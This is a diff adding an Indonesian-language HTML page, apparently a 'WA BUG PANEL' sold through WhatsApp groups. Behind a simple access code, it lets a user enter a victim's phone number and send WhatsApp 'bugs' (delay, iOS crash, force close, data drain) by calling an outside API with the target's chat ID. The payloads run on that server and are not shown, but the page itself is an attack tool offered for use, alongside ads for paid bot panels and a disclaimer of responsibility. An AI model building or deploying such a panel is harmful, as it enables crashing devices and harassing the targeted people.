@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>WA BUG PANEL - bailadev</title>
+  
+  <style>
+  body {
+    margin: 0;
+    background: url("https://files.catbox.moe/xyz80c.jpg") no-repeat center center fixed;
+    background-size: cover;
+    color: #0f0;
+    font-family: 'Courier New', monospace;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  
+  .teks-hitam {
+    color: black;
+  }
+
+  .container {
+    text-align: center;
+    width: 95%;
+    max-width: 500px;
+  }
+
+  h2 {
+    margin-bottom: 20px;
+  }
+
+  input {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 10px;
+    background: #000;
+    color: #0f0;
+    border: 1px solid #0f0;
+  }
+
+  button {
+    width: 100%;
+    padding: 12px;
+    background: #000;
+    color: #0f0;
+    font-weight: bold;
+    border: 2px solid #0f0;
+    cursor: pointer;
+    transition: .3s;
+  }
+
+  button:hover {
+    background: #0f0;
+    color: #000;
+  }
+
+  .btn-bug {
+    width: calc(33.33% - 10px);
+    margin: 5px;
+    display: inline-block;
+  }
+
+  .notif {
+    margin-top: 10px;
+    font-size: 14px;
+    white-space: pre-line;
+    font-weight: bold;
+  }
+
+  #loadingText {
+    display: none;
+    animation: blink 1s step-end infinite;
+    margin-top: 15px;
+    font-weight: bold;
+  }
+
+  @keyframes blink {
+    50% { opacity: 0.4; }
+  }
+
+  .dev-link {
+    display: inline-block;
+    margin: 20px auto 10px;
+    padding: 6px 14px;
+    color: #00ffff;
+    border: 1px solid #00ffff;
+    text-decoration: none;
+    font-weight: bold;
+    border-radius: 6px;
+    font-size: 14px;
+  }
+
+  .dev-link:hover {
+    background: #00ffff;
+    color: #000;
+  }
+
+  .promo-text, .warning-text {
+    font-size: 14px;
+    margin-top: 10px;
+  }
+
+  .promo-text {
+    color: #0f0;
+  }
+
+  .warning-text {
+    color: red;
+  }
+
+  .copyright {
+    margin-top: 20px;
+    font-size: 12px;
+    color: #555;
+  }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h2>🦅 APK BUG BY BAILA</h2>
+
+  <div id="loginBox">
+    <input type="password" id="accessCode" placeholder="masukan kode" />
+    <button onclick="verifyCode()">MASUK</button>
+    <div class="notif" id="notifLogin"></div>
+    <div style="margin-top: 10px;">
+      <span class="teks-hitam">Tidak tahu kode?</span>
+      <a class="dev-link" href="https://chat.whatsapp.com/Iq9AuWpjSZnKQFN3WjZJko?mode=ac_t" target="_blank">Klik di sini</a>
+    </div>
+  </div>
+
+  <div id="mainPanel" style="display:none;">
+    <input type="text" id="targetNumber" placeholder="Nomor Target (628xxxxxxx)" />
+
+    <div class="notif" id="loadingText">⏳ Sedang mengirim bug...</div>
+    <div class="notif" id="notifBug"></div>
+
+    <div style="margin-top: 20px;">
+      <button class="btn-bug" onclick="kirimBug('delay')">Super Delay</button>
+      <button class="btn-bug" onclick="kirimBug('delayinvis')">Invis Delay</button>
+      <button class="btn-bug" onclick="kirimBug('delayhard')">delay batu</button>
+    </div>
+    <div>
+      <button class="btn-bug" onclick="kirimBug('dozer')">sedot Kuota</button>
+      <button class="btn-bug" onclick="kirimBug('iosinvis')">Ios Crash</button>
+      <button class="btn-bug" onclick="kirimBug('iosinvis')">Fc Iphone</button>
+    </div>
+
+    <a class="dev-link" href="https://wa.me/6281330224331" target="_blank">👨‍💻 Developer</a>
+
+    <p class="promo-text">💎 yg mau buy panel bot wa berkualitas murah cat developer.</p>
+    <p class="warning-text">🚫 Gunakan dengan bijak. Penyalahgunaan bukan tanggung jawab developer.</p>
+
+    <div class="copyright">© 2025 baila</div>
+  </div>
+</div>
+
+<script>
+  function verifyCode() {
+    const code = document.getElementById("accessCode").value.trim();
+    const notif = document.getElementById("notifLogin");
+    notif.textContent = "";
+
+    if (code === "https://chat.whatsapp.com/Iq9AuWpjSZnKQFN3WjZJko?mode=ac_t") {
+      notif.style.color = "#0f0";
+      notif.textContent = "✅ Akses diterima!";
+      setTimeout(() => {
+        document.getElementById("loginBox").style.display = "none";
+        document.getElementById("mainPanel").style.display = "block";
+      }, 700);
+    } else {
+      notif.style.color = "red";
+      notif.textContent = "❌ Kode salah!";
+    }
+  }
+
+  function kirimBug(type) {
+    const target = document.getElementById("targetNumber").value.trim();
+    const notif = document.getElementById("notifBug");
+    const loading = document.getElementById("loadingText");
+
+    notif.textContent = "";
+    notif.style.display = "none";
+
+    if (!target.startsWith("62") || target.length < 10) {
+      notif.style.color = "red";
+      notif.textContent = "⚠️ Nomor tidak valid!";
+      notif.style.display = "block";
+      return;
+    }
+
+    loading.style.display = "block";
+
+    const url = `https://apievolution.gacorr.biz.id/evolution?type=${encodeURIComponent(type)}&chatId=${target}@s.whatsapp.net`;
+
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        loading.style.display = "none";
+        if (data.success === true) {
+          notif.style.color = "#0f0";
+          notif.textContent = `✅ BUG "${type}" berhasil dikirim ke ${target}`;
+        } else {
+          notif.style.color = "red";
+          notif.textContent = `❌ Gagal mengirim: ${data.message || "Unknown error"}`;
+        }
+        notif.style.display = "block";
+      })
+      .catch(error => {
+        loading.style.display = "none";
+        notif.style.color = "red";
+        notif.textContent = `❌ Gagal mengirim: ${error}`;
+        notif.style.display = "block";
+      });
+  }
+</script>
+
+</body>
+</html>
